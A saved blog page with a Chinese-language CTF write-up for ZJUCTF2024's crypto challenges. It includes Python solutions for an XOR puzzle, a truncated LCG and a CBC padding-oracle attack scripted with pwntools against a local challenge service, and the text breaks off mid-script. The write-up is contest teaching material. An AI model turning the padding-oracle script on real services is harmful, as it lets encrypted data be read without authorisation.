

<!DOCTYPE html>
<html lang="zh-CN" >



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/assets/title.gif">
  <link rel="icon" href="/assets/title.gif">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="WuYan">
  <meta name="keywords" content="">
  
    <meta name="description" content="7天的比赛熬了好几天，总算是拿到不错的成绩了，学到了很多😀">
<meta property="og:type" content="article">
<meta property="og:title" content="ZJUCTF2024 writeup">
<meta property="og:url" content="http://13.250.14.141/2025/01/17/ZJUCTF2024wp/index.html">
<meta property="og:site_name" content="WuYan&#39;s eave">
<meta property="og:description" content="7天的比赛熬了好几天，总算是拿到不错的成绩了，学到了很多😀">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://13.250.14.141/img/zjuctf2024/ZJUCTF2024.jpg">
<meta property="article:published_time" content="2025-01-17T08:09:31.000Z">
<meta property="article:modified_time" content="2025-01-19T06:51:23.320Z">
<meta property="article:author" content="WuYan">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://13.250.14.141/img/zjuctf2024/ZJUCTF2024.jpg">
  
  
  
  <title>ZJUCTF2024 writeup - WuYan&#39;s eave</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"13.250.14.141","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>WuYan</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/assets/girl.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="ZJUCTF2024 writeup"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-01-17 16:09" pubdate>
          2025年1月17日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          11k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          96 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar category-bar" style="margin-right: -1rem">
    





<div class="category-list">
  
  
    
    
    
    <div class="category row nomargin-x">
      <a class="category-item 
          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="CTF writeup"
        id="heading-61eec73aca74595bf77af749a8323605" role="tab" data-toggle="collapse" href="#collapse-61eec73aca74595bf77af749a8323605"
        aria-expanded="true"
      >
        CTF writeup
        <span class="list-group-count">(1)</span>
        <i class="iconfont icon-arrowright"></i>
      </a>
      
      <div class="category-collapse collapse show" id="collapse-61eec73aca74595bf77af749a8323605"
           role="tabpanel" aria-labelledby="heading-61eec73aca74595bf77af749a8323605">
        
        
          
  <div class="category-post-list">
    
    
      
      
        <a href="/2025/01/17/ZJUCTF2024wp/" title="ZJUCTF2024 writeup"
           class="list-group-item list-group-item-action
           active">
          <span class="category-post">ZJUCTF2024 writeup</span>
        </a>
      
    
  </div>

        
      </div>
    </div>
  
</div>


  </aside>


    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">ZJUCTF2024 writeup</h1>
            
            
              <div class="markdown-body">
                
                <p>比赛时间是2024年的10月15日至22日，对于一场个人赛来说时间还是很充裕的😋</p>
<h1 id="crypto"><strong>Crypto</strong></h1>
<p>这次的密码学竟然没有RSA题目🤨</p>
<h2 id="ezxor">ezxor</h2>
<ul>
<li>一个异或复原题目，但是在程序最后随机改了20个位置；</li>
<li>考虑忽略最后的修改直接通过异或复原： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">realcipher = <span class="hljs-string">&#x27;01100011101101011011011000000011101101000101001001000110001111101011000110010100001111111010011110110000010001100011111110110110010110011011010001000111101111100100101110111001110000000101101001001010010111000100100011000111110000000000111001011101111000000100100001001110010011011011100111000000010000011100000001011101101001111011111001011100010111100101000111000000010111011011001001010001110000000100000110111000010010011011000110100011101110011011100010111111101110111010001110110101101101100011111110111110001110111011110001011001101000100101100001001000010011100100101110111010001111111011110110110001101001111010111000110100011011010111001110011001100000101110011110000100010100100110011110111001101101111011011110010101101110000100101000101011101110011100000110010101100110100100011001001000110000101100101001001001101110011001010110100111101101011001010110010001100011000110011001111101100110000111101110010101110111000010100000100011110110000011111001010110&#x27;</span><br>cipher = realcipher<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipher)-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>    tmp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipher)-<span class="hljs-number">1</span>,i-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        tmp^= <span class="hljs-built_in">int</span>(cipher[j])<br>    cipher = cipher[:i]+<span class="hljs-built_in">str</span>(tmp)+cipher[i+<span class="hljs-number">1</span>:]<br>cipher = <span class="hljs-string">&quot;0&quot;</span>+cipher[:-<span class="hljs-number">1</span>]<br><span class="hljs-comment"># print(cipher)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(cipher),<span class="hljs-number">8</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(cipher[i:i+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>)),end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure></li>
<li>跑出来flag是这玩意:<code>[ÊUCF&#123;Tell_do&gt;e!_Wel£¯me_to_YJUCTF_2&lt;24!&#125;</code>，根据题目提示猜测flag是<code>ZJUCTF&#123;Well_done!_Welcome_to_ZJUCTF_2024!&#125;</code>，验证正确；</li>
</ul>
<h2 id="easypad">easypad</h2>
<ul>
<li>一个简单的CBC的padding填充漏洞，可以根据控制IV来控制解密结果是否符合pad得到原文，写了个恢复原文的脚本: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> urandom<br><span class="hljs-keyword">import</span> random<br><br>KEY = urandom(<span class="hljs-number">16</span>)<br>random.seed(KEY)<br>message = urandom(<span class="hljs-number">16</span>).<span class="hljs-built_in">hex</span>()<br><span class="hljs-built_in">print</span>(message)<br><br><span class="hljs-comment"># pad = lambda msg: msg + (chr(pad_length) * (16 - len(msg) % 16)).encode()</span><br>unpad = <span class="hljs-keyword">lambda</span> msg: <span class="hljs-built_in">bytes</span>([msg[-<span class="hljs-number">1</span>]]) * msg[-<span class="hljs-number">1</span>] == msg[-msg[-<span class="hljs-number">1</span>]:]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">msg: <span class="hljs-built_in">bytes</span></span>):<br>    IV = urandom(<span class="hljs-number">16</span>)<br>    cipher = AES.new(KEY, AES.MODE_CBC, IV)<br>    encrypted = cipher.encrypt(msg)<br>    <span class="hljs-keyword">return</span> IV + encrypted<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">msg: <span class="hljs-built_in">bytes</span></span>):<br>    IV = msg[:<span class="hljs-number">16</span>]<br>    cipher = AES.new(KEY, AES.MODE_CBC, IV)<br>    decrypted = cipher.decrypt(msg[<span class="hljs-number">16</span>:])<br>    <span class="hljs-comment"># print(decrypted)</span><br>    <span class="hljs-keyword">return</span> unpad(decrypted)<br><br>cipher = encrypt(message.encode()).<span class="hljs-built_in">hex</span>()<br><span class="hljs-built_in">print</span>(cipher)<br>cipher = <span class="hljs-built_in">bytes</span>.fromhex(cipher)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(cipher))<br>IV,E1,E2 = cipher[:<span class="hljs-number">16</span>],cipher[<span class="hljs-number">16</span>:<span class="hljs-number">32</span>],cipher[<span class="hljs-number">32</span>:]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">senddecrypt</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">global</span> io<br>    io.recv()<br>    io.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.recv()<br>    io.sendline(text)<br>    res = io.recvline()[:-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hexstr</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:])==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0&quot;</span>+<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">part</span>(<span class="hljs-params">E,E_pre</span>):<br>    ans = <span class="hljs-string">&quot;&quot;</span><br>    temp = [<span class="hljs-string">&quot;00&quot;</span>]*<span class="hljs-number">16</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;0123456789abcdef&quot;</span>:<br>            temp[j] = hexstr(E_pre[j]^(<span class="hljs-number">16</span>-j)^<span class="hljs-built_in">ord</span>(i))<br>            tmp = <span class="hljs-number">1</span><br>            Ct = <span class="hljs-string">&quot;&quot;</span>.join(temp)<br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(Ct)==<span class="hljs-number">32</span><br>            payload = Ct+E.<span class="hljs-built_in">hex</span>()<br>            <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>                res = decrypt(<span class="hljs-built_in">bytes</span>.fromhex(payload))<br>                <span class="hljs-comment"># print(res)</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> res:<br>                    tmp = <span class="hljs-number">0</span><br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> tmp:<br>                ans = i+ans<br>                <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>,j-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>                    temp[z] = hexstr(<span class="hljs-built_in">int</span>(temp[z],<span class="hljs-number">16</span>)^(<span class="hljs-number">16</span>-j)^(<span class="hljs-number">17</span>-j))<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            exit()<br>    <span class="hljs-keyword">return</span> ans<br><br>msg1 = part(E1,IV)<br>msg2 = part(E2,E1)<br>message = msg1+msg2<br><span class="hljs-built_in">print</span>(message)<br></code></pre></td></tr></table></figure></li>
<li>但是注意到题目返回结果是<code>unpad(decrypted) ^ (random.random() &gt; 0.1)</code>，那就多次请求来看看概率分布就可以判断了： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">51245</span>)<br>cipher = io.recvline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>cipher = <span class="hljs-built_in">bytes</span>.fromhex(cipher)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(cipher))<br>IV,E1,E2 = cipher[:<span class="hljs-number">16</span>],cipher[<span class="hljs-number">16</span>:<span class="hljs-number">32</span>],cipher[<span class="hljs-number">32</span>:]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">senddecrypt</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">global</span> io<br>    io.recv()<br>    io.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.recv()<br>    io.sendline(text)<br>    res = io.recvline()[:-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hexstr</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:])==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0&quot;</span>+<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">part</span>(<span class="hljs-params">E,E_pre</span>):<br>    ans = <span class="hljs-string">&quot;&quot;</span><br>    temp = [<span class="hljs-string">&quot;00&quot;</span>]*<span class="hljs-number">16</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;0123456789abcdef&quot;</span>:<br>            temp[j] = hexstr(E_pre[j]^(<span class="hljs-number">16</span>-j)^<span class="hljs-built_in">ord</span>(i))<br>            tmp = <span class="hljs-number">1</span><br>            Ct = <span class="hljs-string">&quot;&quot;</span>.join(temp)<br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(Ct)==<span class="hljs-number">32</span><br>            payload = Ct+E.<span class="hljs-built_in">hex</span>()<br>            times = &#123;<span class="hljs-string">b&quot;False&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">b&quot;True&quot;</span>:<span class="hljs-number">0</span>&#125;<br>            <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>                res = senddecrypt(payload)<br>                times[res] += <span class="hljs-number">1</span> <br>            <span class="hljs-keyword">if</span> times[<span class="hljs-string">b&quot;False&quot;</span>] &gt; times[<span class="hljs-string">b&quot;True&quot;</span>]*<span class="hljs-number">2</span>:<br>                ans = i+ans<br>                <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>,j-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>                    temp[z] = hexstr(<span class="hljs-built_in">int</span>(temp[z],<span class="hljs-number">16</span>)^(<span class="hljs-number">16</span>-j)^(<span class="hljs-number">17</span>-j))<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            exit()<br>    <span class="hljs-keyword">return</span> ans<br><br>msg1 = part(E1,IV)<br>msg2 = part(E2,E1)<br>message = msg1+msg2<br><span class="hljs-built_in">print</span>(message)<br>io.recv()<br>io.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>io.recv()<br>io.sendline(message)<br>io.interactive()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/2.png" srcset="/img/loading.gif" lazyload></li>
</ul>
<h2 id="pseudo">pseudo</h2>
<ul>
<li>关键随机数生成逻辑： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-variable language_">self</span>.K = (<span class="hljs-variable language_">self</span>.a * <span class="hljs-variable language_">self</span>.K + <span class="hljs-variable language_">self</span>.b) % <span class="hljs-variable language_">self</span>.c<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.K // <span class="hljs-variable language_">self</span>.d<br></code></pre></td></tr></table></figure></li>
<li>懒得写latex公式了，于是手写了一份wp解题思路: <img src="/img/zjuctf2024/10.png" srcset="/img/loading.gif" lazyload> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br>a = <span class="hljs-number">0x5680951767695824a313b0f7334bc38478cb4b9c572605476afcd28ac7ebd331ce5eb1</span><br>b = <span class="hljs-number">0x79f17055ba11954ffcae4bbd107fa270f789109a6df0295061a0547888719196</span><br>c = <span class="hljs-number">0x160f8d6811c8f089d7ee35b9d1ed4b2f445a712bf654f93fcb4dc7bb619186f91a79d87b8a54749ca8869a6984e314a1aa8d5bfe7019da406823c69d958b6ae6</span><br>d = <span class="hljs-number">0xc406ce580f97fe41b5b49b0d54044e23d2b3fe844c9d4bba68b444d2e8abc71d</span><br>R0 = <span class="hljs-number">0xf9ad0aaac650a41906294c3dc0044050f7522d055b512a95836ad36225076a5</span><br>R1 = <span class="hljs-number">0x10a69f08a8c3a7f0ffc5e73f5aa94737a62b389a9256e4705261bd23a22cd4f9</span><br><br><span class="hljs-comment"># t = 36438581768728120251810633059169809446924506563640328377786754579743452784368</span><br><span class="hljs-comment"># K1 = R0*d+t</span><br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-comment"># print((a*t)//c)</span><br><span class="hljs-built_in">print</span>((a*d*R0+b)%c)<br><span class="hljs-built_in">print</span>((R1*d-(a*d*R0+b))%c)<br><span class="hljs-comment"># print(((a*K1+b)%c)//d==R1)</span><br><br>p = (R1*d-(a*d*R0+b))%c<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">t,r</span>):<br>    <span class="hljs-keyword">return</span> (a*t+b+R0*d*a)%c == R1*d+r<br><br>k = <span class="hljs-number">0</span><br>bitlength = <span class="hljs-number">2</span>**<span class="hljs-number">256</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    q = c*k + p<br>    t = q//a+<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> t &gt; bitlength:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        r = a*t-q<br>        <span class="hljs-keyword">if</span> r &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> r &gt; d:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> test(t,r):<br>                <span class="hljs-built_in">print</span>([t,r,k])<br>        t += <span class="hljs-number">1</span><br>    k += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li>
<li>用这个解题思路写出脚本然后交互，多组解用sha来判断唯一性: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes <span class="hljs-keyword">as</span> i2b<br><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">59789</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;a&quot;</span>)<br>a   = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-number">3</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>b   = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-number">4</span>:-<span class="hljs-number">1</span>],<span 